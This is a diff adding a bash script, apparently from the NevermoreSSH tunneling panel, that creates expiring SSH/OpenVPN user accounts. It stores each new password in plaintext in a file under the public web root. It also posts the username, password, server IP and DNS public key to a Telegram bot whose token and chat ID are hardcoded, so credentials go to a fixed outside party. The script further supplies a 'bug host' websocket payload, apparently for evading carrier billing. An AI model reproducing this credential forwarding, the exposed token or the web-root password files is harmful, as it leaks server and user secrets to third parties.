@@ -1,0 +1,151 @@
+#!/bin/bash
+clear
+red() { echo -e "\\033[32;1m${*}\\033[0m"; }
+TIMES="10"
+CHATID="-1001891259267"
+KEY="2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[42m              SSH Ovpn Account           \E[0m"
+echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+read -p "Username : " LOGIN
+read -p "Password : " PASSWD
+read -p "Expired (hari): " EXPIRED
+IP=$(curl -sS ifconfig.me)
+CITY=$(cat /etc/xray/city)
+PUB=$( cat /etc/slowdns/server.pub )
+NS=`cat /etc/xray/dns`
+domain=`cat /etc/xray/domain`
+useradd -e `date -d "$EXPIRED days" +"%Y-%m-%d"` -s /bin/false -M $LOGIN
+exp="$(chage -l $LOGIN | grep "Account expires" | awk -F": " '{print $2}')"
+echo -e "$PASSWD\n$PASSWD\n"|passwd $LOGIN &> /dev/null
+
+if [[ ${c} != "0" ]]; then
+  echo "${d}" >/etc/ssh/${LOGIN}
+fi
+DATADB=$(cat /etc/ssh/.ssh.db | grep "^###" | grep -w "${LOGIN}" | awk '{print $2}')
+if [[ "${DATADB}" != '' ]]; then
+  sed -i "/\b${LOGIN}\b/d" /etc/ssh/.ssh.db
+fi
+echo "### ${LOGIN} " >>/etc/ssh/.ssh.db
+
+cat > /var/www/html/ssh-$LOGIN.txt <<-END
+====================================================================
+             P R O J E C T  O F  N E V E R M O R E S S H
+                       [Freedom Internet]
+====================================================================
+        https://github.com/NevermoreSSH/skywalk
+====================================================================
+              Format SSH OVPN Account
+====================================================================
+
+Username         : $LOGIN
+Password         : $PASSWD
+Expired          : $exp
+__________________________________
+IP               : $IP
+Host             : $domain
+Host Slowdns     : ${NS}
+Pub Key          : ${PUB}
+Location         : $CITY
+Port OpenSSH     : 443, 80, 22
+Port Dropbear    : 443, 109
+Port Dropbear WS : 443, 109
+Port SSH WS      : 80
+Port SSH SSL WS  : 443
+Port SSL/TLS     : 443
+Port OVPN WS SSL : 443
+Port OVPN SSL    : 443
+Port OVPN TCP    : 443, 1194
+Port OVPN UDP    : 2200
+Proxy Squid 1    : 3128
+Proxy Squid 2    : 8000
+Proxy Squid 3    : 8080
+BadVPN UDP       : 7100, 7300, 7300
+__________________________________
+Payload WSS: GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf] 
+__________________________________
+OpenVPN WS SSL : https://$domain:81/"$domain"-ws-ssl.ovpn
+OpenVPN SSL : https://$domain:81/"$domain"-ssl.ovpn
+OpenVPN TCP : https://$domain:81/"$domain"-tcp.ovpn
+OpenVPN UDP : https://$domain:81/"$domain"-udp.ovpn
+__________________________________
+
+END
+TEXT="
+<code>───────────────────────────</code>
+<code>      SSH OVPN Account     </code>
+<code>───────────────────────────</code>
+<code>Username         : $LOGIN</code>
+<code>Password         : $PASSWD</code>
+<code>Expired          : $exp</code>
+<code>───────────────────────────</code>
+<code>IP               : $IP</code>
+<code>Host             : $domain</code>
+<code>Host Slowdns     : ${NS}</code>
+<code>Pub Key          : ${PUB}</code>
+<code>Location         : $CITY</code>
+<code>Port OpenSSH     : 443, 80, 22</code>
+<code>Port Dropbear    : 443, 109</code>
+<code>Port Dropbear WS : 443, 109</code>
+<code>Port DNS         : 443, 53, 22</code> 
+<code>Port SSH WS      : 80 </code>
+<code>Port SSH SSL WS  : 443</code>
+<code>Port SSL/TLS     : 443</code>
+<code>Port OVPN WS SSL : 443</code>
+<code>Port OVPN SSL    : 443</code>
+<code>Port OVPN TCP    : 443, 1194</code>
+<code>Port OVPN UDP    : 2200</code>
+<code>Proxy Squid      : 3128</code>
+<code>BadVPN UDP       : 7100, 7300, 7300</code>
+<code>───────────────────────────</code>
+<code>Payload WSS      : </code><code>GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf]</code>
+<code>───────────────────────────</code>
+<code>OpenVPN WS SSL   : </code>https://$domain:81/"$domain"-ws-ssl.ovpn
+<code>OpenVPN SSL      : </code>https://$domain:81/"$domain"-ssl.ovpn
+<code>OpenVPN TCP      : </code>https://$domain:81/"$domain"-tcp.ovpn
+<code>OpenVPN UDP      : </code>https://$domain:81/"$domain"-udp.ovpn
+<code>───────────────────────────</code>
+<code>Save Link Account: </code>https://$domain:81/ssh-$LOGIN.txt
+<code>───────────────────────────</code>
+"
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL
+clear
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "\e[42m      SSH OVPN Account     \E[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "Username         : $LOGIN" | tee -a /etc/nevermoressh/user.log
+echo -e "Password         : $PASSWD" | tee -a /etc/nevermoressh/user.log
+echo -e "Expired          : $exp" | tee -a /etc/nevermoressh/user.log
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "IP               : $IP" | tee -a /etc/nevermoressh/user.log
+echo -e "Host             : $domain" | tee -a /etc/nevermoressh/user.log
+echo -e "Host Slowdns     : ${NS}" | tee -a /etc/nevermoressh/user.log
+echo -e "Pub Key          : ${PUB}" | tee -a /etc/nevermoressh/user.log
+#echo -e "Location         : $CITY" | tee -a /etc/nevermoressh/user.log
+echo -e "Port OpenSSH     : 443, 80, 22" | tee -a /etc/nevermoressh/user.log
+echo -e "Port DNS         : 443, 53 ,22 " | tee -a /etc/nevermoressh/user.log
+echo -e "Port Dropbear    : 443, 109" | tee -a /etc/nevermoressh/user.log
+echo -e "Port Dropbear WS : 443, 109" | tee -a /etc/nevermoressh/user.log
+echo -e "Port SSH WS      : 80 " | tee -a /etc/nevermoressh/user.log
+echo -e "Port SSH SSL WS  : 443" | tee -a /etc/nevermoressh/user.log
+echo -e "Port SSL/TLS     : 443" | tee -a /etc/nevermoressh/user.log
+echo -e "Port OVPN WS SSL : 443" | tee -a /etc/nevermoressh/user.log
+echo -e "Port OVPN SSL    : 443" | tee -a /etc/nevermoressh/user.log
+echo -e "Port OVPN TCP    : 443, 1194" | tee -a /etc/nevermoressh/user.log
+echo -e "Port OVPN UDP    : 2200" | tee -a /etc/nevermoressh/user.log
+echo -e "Proxy Squid      : 3128" | tee -a /etc/nevermoressh/user.log
+echo -e "BadVPN UDP       : 7100, 7300, 7300" | tee -a /etc/nevermoressh/user.log
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "Payload WSS      : GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf]" | tee -a /etc/nevermoressh/user.log
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "OpenVPN WS SSL   : https://$domain:81/"$domain"-ws-ssl.ovpn" | tee -a /etc/nevermoressh/user.log
+echo -e "OpenVPN SSL      : https://$domain:81/"$domain"-ssl.ovpn" | tee -a /etc/nevermoressh/user.log
+echo -e "OpenVPN TCP      : https://$domain:81/"$domain"-tcp.ovpn" | tee -a /etc/nevermoressh/user.log
+echo -e "OpenVPN UDP      : https://$domain:81/"$domain"-udp.ovpn" | tee -a /etc/nevermoressh/user.log
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "Save Link Account: https://$domain:81/ssh-$LOGIN.txt"
+echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/nevermoressh/user.log
+echo -e "" | tee -a /etc/nevermoressh/user.log
+read -n 1 -s -r -p "Press any key to back on menu"
+menu
